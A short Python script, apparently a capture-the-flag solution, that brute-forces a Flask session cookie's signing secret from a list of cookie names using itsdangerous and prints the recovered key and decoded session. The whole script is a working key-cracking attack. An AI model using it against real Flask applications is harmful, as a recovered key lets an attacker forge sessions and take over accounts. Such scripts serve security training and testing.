import hashlib
from itsdangerous import URLSafeTimedSerializer, BadSignature
from flask.sessions import TaggedJSONSerializer

cookie = "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaG7fA.FxgY6jM9zDGJNbypReMx3SyInI8"

cookie_names = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin",
    "gingersnap", "shortbread", "peanut butter",
    "whoopie pie", "sugar", "molasses", "kiss",
    "biscotti", "butter", "spritz", "snowball",
    "drop", "thumbprint", "pinwheel", "wafer",
    "macaroon", "fortune", "crinkle", "icebox",
    "gingerbread", "tassie", "lebkuchen", "macaron",
    "black and white", "white chocolate macadamia"
]

for secret in cookie_names:
    s = URLSafeTimedSerializer(
        secret_key=secret,
        salt="cookie-session",
        serializer=TaggedJSONSerializer(),
        signer_kwargs={
            "key_derivation": "hmac",
            "digest_method": hashlib.sha1
        }
    )

    try:
        data = s.loads(cookie)
        print(f"[+] Secret key found: {secret}")
        print(f"[+] Decoded session: {data}")
        break
    except BadSignature:
        continue
else:
    print("[-] No valid secret found")
